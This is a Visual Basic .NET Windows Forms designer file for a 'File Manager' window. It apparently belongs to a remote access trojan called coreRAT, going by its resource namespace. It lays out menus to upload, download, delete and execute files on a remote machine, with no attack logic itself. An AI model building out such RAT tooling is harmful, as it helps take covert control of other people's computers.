<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class FormfileManager
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(FormfileManager))
        Me.ImageList_FileManager = New System.Windows.Forms.ImageList(Me.components)
        Me.rightclick_nothing = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreateNewFolderToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreateNewFileToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.UploadFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.rightclick_filemanagerfolders = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreateNewFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreateNewFileToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RenameFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MoveThisFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UploadFileToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExecutePathToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.rightclick_filemanagerfiles = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreateNewFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreateNewFileToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RenameFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MoveFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DownloadFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UploadFileToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExecuteFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.ListView_Files = New System.Windows.Forms.ListView()
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader8 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader9 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader10 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader11 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.ComboBox1 = New System.Windows.Forms.ComboBox()
        Me.rightclick_nothing.SuspendLayout()
        Me.rightclick_filemanagerfolders.SuspendLayout()
        Me.rightclick_filemanagerfiles.SuspendLayout()
        Me.Panel1.SuspendLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'ImageList_FileManager
        '
        Me.ImageList_FileManager.ImageStream = CType(resources.GetObject("ImageList_FileManager.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList_FileManager.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList_FileManager.Images.SetKeyName(0, "folder-horizontal.png")
        Me.ImageList_FileManager.Images.SetKeyName(1, "application-blue.png")
        Me.ImageList_FileManager.Images.SetKeyName(2, "blue-document-code.png")
        Me.ImageList_FileManager.Images.SetKeyName(3, "blue-document-excel.png")
        Me.ImageList_FileManager.Images.SetKeyName(4, "blue-document-flash-movie.png")
        Me.ImageList_FileManager.Images.SetKeyName(5, "blue-document-globe.png")
        Me.ImageList_FileManager.Images.SetKeyName(6, "blue-document-illustrator.png")
        Me.ImageList_FileManager.Images.SetKeyName(7, "blue-document-music.png")
        Me.ImageList_FileManager.Images.SetKeyName(8, "blue-document-pdf.png")
        Me.ImageList_FileManager.Images.SetKeyName(9, "blue-document-photoshop.png")
        Me.ImageList_FileManager.Images.SetKeyName(10, "blue-document-php.png")
        Me.ImageList_FileManager.Images.SetKeyName(11, "blue-document-powerpoint.png")
        Me.ImageList_FileManager.Images.SetKeyName(12, "blue-document-visual-studio.png")
        Me.ImageList_FileManager.Images.SetKeyName(13, "blue-document-word.png")
        Me.ImageList_FileManager.Images.SetKeyName(14, "blue-document-xaml.png")
        Me.ImageList_FileManager.Images.SetKeyName(15, "briefcase.png")
        Me.ImageList_FileManager.Images.SetKeyName(16, "database.png")
        Me.ImageList_FileManager.Images.SetKeyName(17, "document.png")
        Me.ImageList_FileManager.Images.SetKeyName(18, "document-outlook.png")
        Me.ImageList_FileManager.Images.SetKeyName(19, "film.png")
        Me.ImageList_FileManager.Images.SetKeyName(20, "folder-zipper.png")
        Me.ImageList_FileManager.Images.SetKeyName(21, "image.png")
        Me.ImageList_FileManager.Images.SetKeyName(22, "script.png")
        Me.ImageList_FileManager.Images.SetKeyName(23, "folder-horizontal-up.png")
        Me.ImageList_FileManager.Images.SetKeyName(24, "document-text.png")
        '
        'rightclick_nothing
        '
        Me.rightclick_nothing.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem3, Me.CreateNewFolderToolStripMenuItem1, Me.CreateNewFileToolStripMenuItem3, Me.UploadFileToolStripMenuItem})
        Me.rightclick_nothing.Name = "rightclick_nothing"
        Me.rightclick_nothing.Size = New System.Drawing.Size(172, 92)
        '
        'RefreshToolStripMenuItem3
        '
        Me.RefreshToolStripMenuItem3.BackColor = System.Drawing.Color.White
        Me.RefreshToolStripMenuItem3.ForeColor = System.Drawing.Color.Black
        Me.RefreshToolStripMenuItem3.Image = CType(resources.GetObject("RefreshToolStripMenuItem3.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem3.Name = "RefreshToolStripMenuItem3"
        Me.RefreshToolStripMenuItem3.Size = New System.Drawing.Size(171, 22)
        Me.RefreshToolStripMenuItem3.Text = "Refresh"
        '
        'CreateNewFolderToolStripMenuItem1
        '
        Me.CreateNewFolderToolStripMenuItem1.BackColor = System.Drawing.Color.White
        Me.CreateNewFolderToolStripMenuItem1.ForeColor = System.Drawing.Color.Black
        Me.CreateNewFolderToolStripMenuItem1.Image = CType(resources.GetObject("CreateNewFolderToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.CreateNewFolderToolStripMenuItem1.Name = "CreateNewFolderToolStripMenuItem1"
        Me.CreateNewFolderToolStripMenuItem1.Size = New System.Drawing.Size(171, 22)
        Me.CreateNewFolderToolStripMenuItem1.Text = "Create New Folder"
        '
        'CreateNewFileToolStripMenuItem3
        '
        Me.CreateNewFileToolStripMenuItem3.BackColor = System.Drawing.Color.White
        Me.CreateNewFileToolStripMenuItem3.ForeColor = System.Drawing.Color.Black
        Me.CreateNewFileToolStripMenuItem3.Image = CType(resources.GetObject("CreateNewFileToolStripMenuItem3.Image"), System.Drawing.Image)
        Me.CreateNewFileToolStripMenuItem3.Name = "CreateNewFileToolStripMenuItem3"
        Me.CreateNewFileToolStripMenuItem3.Size = New System.Drawing.Size(171, 22)
        Me.CreateNewFileToolStripMenuItem3.Text = "Create New File"
        '
        'UploadFileToolStripMenuItem
        '
        Me.UploadFileToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.UploadFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.UploadFileToolStripMenuItem.Image = CType(resources.GetObject("UploadFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UploadFileToolStripMenuItem.Name = "UploadFileToolStripMenuItem"
        Me.UploadFileToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.UploadFileToolStripMenuItem.Text = "Upload File"
        '
        'rightclick_filemanagerfolders
        '
        Me.rightclick_filemanagerfolders.BackColor = System.Drawing.SystemColors.Control
        Me.rightclick_filemanagerfolders.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem1, Me.CreateNewFolderToolStripMenuItem, Me.CreateNewFileToolStripMenuItem1, Me.DeleteFolderToolStripMenuItem, Me.RenameFolderToolStripMenuItem, Me.MoveThisFolderToolStripMenuItem, Me.UploadFileToolStripMenuItem2, Me.ExecutePathToolStripMenuItem})
        Me.rightclick_filemanagerfolders.Name = "rightclick_filemanager"
        Me.rightclick_filemanagerfolders.Size = New System.Drawing.Size(172, 180)
        '
        'RefreshToolStripMenuItem1
        '
        Me.RefreshToolStripMenuItem1.BackColor = System.Drawing.Color.White
        Me.RefreshToolStripMenuItem1.ForeColor = System.Drawing.Color.Black
        Me.RefreshToolStripMenuItem1.Image = CType(resources.GetObject("RefreshToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem1.Name = "RefreshToolStripMenuItem1"
        Me.RefreshToolStripMenuItem1.Size = New System.Drawing.Size(171, 22)
        Me.RefreshToolStripMenuItem1.Text = "Refresh"
        '
        'CreateNewFolderToolStripMenuItem
        '
        Me.CreateNewFolderToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.CreateNewFolderToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.CreateNewFolderToolStripMenuItem.Image = CType(resources.GetObject("CreateNewFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CreateNewFolderToolStripMenuItem.Name = "CreateNewFolderToolStripMenuItem"
        Me.CreateNewFolderToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.CreateNewFolderToolStripMenuItem.Text = "Create New Folder"
        '
        'CreateNewFileToolStripMenuItem1
        '
        Me.CreateNewFileToolStripMenuItem1.BackColor = System.Drawing.Color.White
        Me.CreateNewFileToolStripMenuItem1.ForeColor = System.Drawing.Color.Black
        Me.CreateNewFileToolStripMenuItem1.Image = CType(resources.GetObject("CreateNewFileToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.CreateNewFileToolStripMenuItem1.Name = "CreateNewFileToolStripMenuItem1"
        Me.CreateNewFileToolStripMenuItem1.Size = New System.Drawing.Size(171, 22)
        Me.CreateNewFileToolStripMenuItem1.Text = "Create New File"
        '
        'DeleteFolderToolStripMenuItem
        '
        Me.DeleteFolderToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.DeleteFolderToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.DeleteFolderToolStripMenuItem.Image = CType(resources.GetObject("DeleteFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DeleteFolderToolStripMenuItem.Name = "DeleteFolderToolStripMenuItem"
        Me.DeleteFolderToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.DeleteFolderToolStripMenuItem.Text = "Delete Folder"
        '
        'RenameFolderToolStripMenuItem
        '
        Me.RenameFolderToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.RenameFolderToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RenameFolderToolStripMenuItem.Image = CType(resources.GetObject("RenameFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RenameFolderToolStripMenuItem.Name = "RenameFolderToolStripMenuItem"
        Me.RenameFolderToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.RenameFolderToolStripMenuItem.Text = "Rename Folder"
        '
        'MoveThisFolderToolStripMenuItem
        '
        Me.MoveThisFolderToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.MoveThisFolderToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.MoveThisFolderToolStripMenuItem.Image = CType(resources.GetObject("MoveThisFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MoveThisFolderToolStripMenuItem.Name = "MoveThisFolderToolStripMenuItem"
        Me.MoveThisFolderToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.MoveThisFolderToolStripMenuItem.Text = "Move this Folder"
        '
        'UploadFileToolStripMenuItem2
        '
        Me.UploadFileToolStripMenuItem2.BackColor = System.Drawing.Color.White
        Me.UploadFileToolStripMenuItem2.ForeColor = System.Drawing.Color.Black
        Me.UploadFileToolStripMenuItem2.Image = CType(resources.GetObject("UploadFileToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.UploadFileToolStripMenuItem2.Name = "UploadFileToolStripMenuItem2"
        Me.UploadFileToolStripMenuItem2.Size = New System.Drawing.Size(171, 22)
        Me.UploadFileToolStripMenuItem2.Text = "Upload File"
        '
        'ExecutePathToolStripMenuItem
        '
        Me.ExecutePathToolStripMenuItem.Image = Global.coreRAT.My.Resources.Resources.folder
        Me.ExecutePathToolStripMenuItem.Name = "ExecutePathToolStripMenuItem"
        Me.ExecutePathToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.ExecutePathToolStripMenuItem.Text = "Execute Path"
        '
        'rightclick_filemanagerfiles
        '
        Me.rightclick_filemanagerfiles.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem2, Me.CreateNewFileToolStripMenuItem, Me.CreateNewFileToolStripMenuItem2, Me.DeleteFileToolStripMenuItem, Me.RenameFileToolStripMenuItem, Me.MoveFileToolStripMenuItem, Me.DownloadFileToolStripMenuItem, Me.UploadFileToolStripMenuItem1, Me.ExecuteFileToolStripMenuItem})
        Me.rightclick_filemanagerfiles.Name = "rightclick_filemanagerfiles"
        Me.rightclick_filemanagerfiles.Size = New System.Drawing.Size(172, 202)
        '
        'RefreshToolStripMenuItem2
        '
        Me.RefreshToolStripMenuItem2.BackColor = System.Drawing.Color.White
        Me.RefreshToolStripMenuItem2.ForeColor = System.Drawing.Color.Black
        Me.RefreshToolStripMenuItem2.Image = CType(resources.GetObject("RefreshToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem2.Name = "RefreshToolStripMenuItem2"
        Me.RefreshToolStripMenuItem2.Size = New System.Drawing.Size(171, 22)
        Me.RefreshToolStripMenuItem2.Text = "Refresh"
        '
        'CreateNewFileToolStripMenuItem
        '
        Me.CreateNewFileToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.CreateNewFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.CreateNewFileToolStripMenuItem.Image = CType(resources.GetObject("CreateNewFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CreateNewFileToolStripMenuItem.Name = "CreateNewFileToolStripMenuItem"
        Me.CreateNewFileToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.CreateNewFileToolStripMenuItem.Text = "Create New Folder"
        '
        'CreateNewFileToolStripMenuItem2
        '
        Me.CreateNewFileToolStripMenuItem2.BackColor = System.Drawing.Color.White
        Me.CreateNewFileToolStripMenuItem2.ForeColor = System.Drawing.Color.Black
        Me.CreateNewFileToolStripMenuItem2.Image = CType(resources.GetObject("CreateNewFileToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.CreateNewFileToolStripMenuItem2.Name = "CreateNewFileToolStripMenuItem2"
        Me.CreateNewFileToolStripMenuItem2.Size = New System.Drawing.Size(171, 22)
        Me.CreateNewFileToolStripMenuItem2.Text = "Create New File"
        '
        'DeleteFileToolStripMenuItem
        '
        Me.DeleteFileToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.DeleteFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.DeleteFileToolStripMenuItem.Image = CType(resources.GetObject("DeleteFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DeleteFileToolStripMenuItem.Name = "DeleteFileToolStripMenuItem"
        Me.DeleteFileToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.DeleteFileToolStripMenuItem.Text = "Delete File"
        '
        'RenameFileToolStripMenuItem
        '
        Me.RenameFileToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.RenameFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RenameFileToolStripMenuItem.Image = CType(resources.GetObject("RenameFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RenameFileToolStripMenuItem.Name = "RenameFileToolStripMenuItem"
        Me.RenameFileToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.RenameFileToolStripMenuItem.Text = "Rename File"
        '
        'MoveFileToolStripMenuItem
        '
        Me.MoveFileToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.MoveFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.MoveFileToolStripMenuItem.Image = CType(resources.GetObject("MoveFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MoveFileToolStripMenuItem.Name = "MoveFileToolStripMenuItem"
        Me.MoveFileToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.MoveFileToolStripMenuItem.Text = "Move File"
        '
        'DownloadFileToolStripMenuItem
        '
        Me.DownloadFileToolStripMenuItem.BackColor = System.Drawing.Color.White
        Me.DownloadFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.DownloadFileToolStripMenuItem.Image = CType(resources.GetObject("DownloadFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DownloadFileToolStripMenuItem.Name = "DownloadFileToolStripMenuItem"
        Me.DownloadFileToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.DownloadFileToolStripMenuItem.Text = "Download File"
        '
        'UploadFileToolStripMenuItem1
        '
        Me.UploadFileToolStripMenuItem1.BackColor = System.Drawing.Color.White
        Me.UploadFileToolStripMenuItem1.ForeColor = System.Drawing.Color.Black
        Me.UploadFileToolStripMenuItem1.Image = CType(resources.GetObject("UploadFileToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.UploadFileToolStripMenuItem1.Name = "UploadFileToolStripMenuItem1"
        Me.UploadFileToolStripMenuItem1.Size = New System.Drawing.Size(171, 22)
        Me.UploadFileToolStripMenuItem1.Text = "Upload File"
        '
        'ExecuteFileToolStripMenuItem
        '
        Me.ExecuteFileToolStripMenuItem.Image = Global.coreRAT.My.Resources.Resources.play
        Me.ExecuteFileToolStripMenuItem.Name = "ExecuteFileToolStripMenuItem"
        Me.ExecuteFileToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.ExecuteFileToolStripMenuItem.Text = "Execute File"
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.White
        Me.Panel1.Controls.Add(Me.PictureBox2)
        Me.Panel1.Controls.Add(Me.ListView_Files)
        Me.Panel1.Controls.Add(Me.TextBox1)
        Me.Panel1.Controls.Add(Me.ComboBox1)
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(803, 472)
        Me.Panel1.TabIndex = 3
        '
        'PictureBox2
        '
        Me.PictureBox2.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.PictureBox2.Image = CType(resources.GetObject("PictureBox2.Image"), System.Drawing.Image)
        Me.PictureBox2.Location = New System.Drawing.Point(758, 16)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(25, 25)
        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox2.TabIndex = 8
        Me.PictureBox2.TabStop = False
        '
        'ListView_Files
        '
        Me.ListView_Files.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
                    Or System.Windows.Forms.AnchorStyles.Left) _
                    Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ListView_Files.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader7, Me.ColumnHeader8, Me.ColumnHeader9, Me.ColumnHeader10, Me.ColumnHeader11})
        Me.ListView_Files.ContextMenuStrip = Me.rightclick_nothing
        Me.ListView_Files.Location = New System.Drawing.Point(21, 47)
        Me.ListView_Files.Name = "ListView_Files"
        Me.ListView_Files.Size = New System.Drawing.Size(762, 403)
        Me.ListView_Files.SmallImageList = Me.ImageList_FileManager
        Me.ListView_Files.TabIndex = 7
        Me.ListView_Files.UseCompatibleStateImageBehavior = False
        Me.ListView_Files.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "Files"
        Me.ColumnHeader7.Width = 239
        '
        'ColumnHeader8
        '
        Me.ColumnHeader8.Text = "Creation Time"
        Me.ColumnHeader8.Width = 161
        '
        'ColumnHeader9
        '
        Me.ColumnHeader9.Text = "Last Access Time"
        Me.ColumnHeader9.Width = 182
        '
        'ColumnHeader10
        '
        Me.ColumnHeader10.Text = "File Size"
        Me.ColumnHeader10.Width = 98
        '
        'ColumnHeader11
        '
        Me.ColumnHeader11.Text = ""
        Me.ColumnHeader11.Width = 0
        '
        'TextBox1
        '
        Me.TextBox1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Left) _
                    Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.TextBox1.Location = New System.Drawing.Point(126, 16)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(626, 20)
        Me.TextBox1.TabIndex = 6
        '
        'ComboBox1
        '
        Me.ComboBox1.FormattingEnabled = True
        Me.ComboBox1.Location = New System.Drawing.Point(21, 16)
        Me.ComboBox1.Name = "ComboBox1"
        Me.ComboBox1.Size = New System.Drawing.Size(99, 21)
        Me.ComboBox1.TabIndex = 5
        '
        'FormfileManager
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(803, 472)
        Me.Controls.Add(Me.Panel1)
        Me.Name = "FormfileManager"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "File Manager"
        Me.rightclick_nothing.ResumeLayout(False)
        Me.rightclick_filemanagerfolders.ResumeLayout(False)
        Me.rightclick_filemanagerfiles.ResumeLayout(False)
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents ImageList_FileManager As System.Windows.Forms.ImageList
    Friend WithEvents rightclick_nothing As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem3 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CreateNewFolderToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CreateNewFileToolStripMenuItem3 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UploadFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents rightclick_filemanagerfolders As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CreateNewFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CreateNewFileToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RenameFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MoveThisFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UploadFileToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents rightclick_filemanagerfiles As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CreateNewFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CreateNewFileToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RenameFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MoveFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DownloadFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UploadFileToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents PictureBox2 As System.Windows.Forms.PictureBox
    Public WithEvents ListView_Files As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader7 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader8 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader9 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader10 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader11 As System.Windows.Forms.ColumnHeader
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents ComboBox1 As System.Windows.Forms.ComboBox
    Friend WithEvents ExecuteFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ExecutePathToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
End Class
